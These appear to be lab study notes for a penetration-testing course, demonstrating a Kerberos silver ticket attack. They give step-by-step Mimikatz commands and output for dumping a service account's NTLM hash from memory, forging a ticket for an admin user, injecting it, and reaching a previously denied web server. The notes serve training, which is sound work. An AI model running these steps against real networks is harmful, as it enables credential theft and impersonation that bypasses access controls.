# Silver Tickets

Trying to access the web page on WEB04 as user jeff
>``` shell
>PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
>
># ========== Expected Result ==========
>iwr :
>401 - Unauthorized: Access is denied due to invalid credentials.
>Server Error
>
>  401 - Unauthorized: Access is denied due to invalid credentials.
>  You do not have permission to view this directory or page using the credentials that you supplied.
>
>At line:1 char:1
>+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
>   eption
>    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
># =====================================
>```

Using Mimikatz to obtain the NTLM hash of the user account iis_service which is mapped to the target SPN
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # sekurlsa::logonpasswords
>
># ========== Expected Result ==========
>Authentication Id : 0 ; 1147751 (00000000:00118367)
>Session           : Service from 0
>User Name         : iis_service
>Domain            : CORP
>Logon Server      : DC1
>Logon Time        : 9/14/2022 4:52:14 AM
>SID               : S-1-5-21-1987370270-658905905-1781884369-1109
>        msv :
>         [00000003] Primary
>         * Username : iis_service
>         * Domain   : CORP
>         * NTLM     : 4d28cf5252d39971419580a51484ca09
>         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
>         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
>...
># =====================================
>```

Obtaining the domain SID
>``` shell
>PS C:\Users\jeff> whoami /user
>
># ========== Expected Result ==========
>USER INFORMATION
>----------------
>
>User Name SID
>========= =============================================
>corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
># =====================================
>```

Forging the service ticket with the user jeffadmin and injecting it into the current session
>``` shell
>mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
>
># ========== Expected Result ==========
>User      : jeffadmin
>Domain    : corp.com (CORP)
>SID       : S-1-5-21-1987370270-658905905-1781884369
>User Id   : 500
>Groups Id : *513 512 520 518 519
>ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
>Service   : http
>Target    : web04.corp.com
>Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
>-> Ticket : ** Pass The Ticket **
>
> * PAC generated
> * PAC signed
> * EncTicketPart generated
> * EncTicketPart encrypted
> * KrbCred generated
>
>Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
># =====================================
>
>mimikatz # exit
>
># ========== Expected Result ==========
>Bye!
># =====================================
>```

Listing Kerberos tickets to confirm the silver ticket is submitted to the current session
>``` shell
>PS C:\Tools> klist
>
># ========== Expected Result ==========
>Current LogonId is 0:0xa04cc
>
>Cached Tickets: (1)
>
>#0>     Client: jeffadmin @ corp.com
>        Server: http/web04.corp.com @ corp.com
>        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
>        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
>        Start Time: 9/14/2022 4:37:32 (local)
>        End Time:   9/11/2032 4:37:32 (local)
>        Renew Time: 9/11/2032 4:37:32 (local)
>        Session Key Type: RSADSI RC4-HMAC(NT)
>        Cache Flags: 0
>        Kdc Called:
># =====================================
>```

Accessing the SMB share with the silver ticket
>``` shell
>PS C:\Tools> iwr -UseDefaultCredentials http://web04
>
># ========== Expected Result ==========
>StatusCode        : 200
>StatusDescription : OK
>Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
>                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
>                    <html xmlns="http://www.w3.org/1999/xhtml">
>                    <head>
>                    <meta http-equiv="Content-Type" cont...
>RawContent        : HTTP/1.1 200 OK
>                    Persistent-Auth: true
>                    Accept-Ranges: bytes
>                    Content-Length: 703
>                    Content-Type: text/html
>                    Date: Wed, 14 Sep 2022 11:37:39 GMT
>                    ETag: "b752f823fc8d81:0"
>                    Last-Modified: Wed, 14 Sep 20...
>Forms             :
>Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
>                    text/html]...}
>Images            : {}
>InputFields       : {}
>Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
>                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
>                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
>ParsedHtml        :
>RawContentLength  : 703
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to forge a silver ticket for jeffadmin in order to access the web page located at http://web04. Review the source code of the page and find the flag.
>``` shell
>
>```
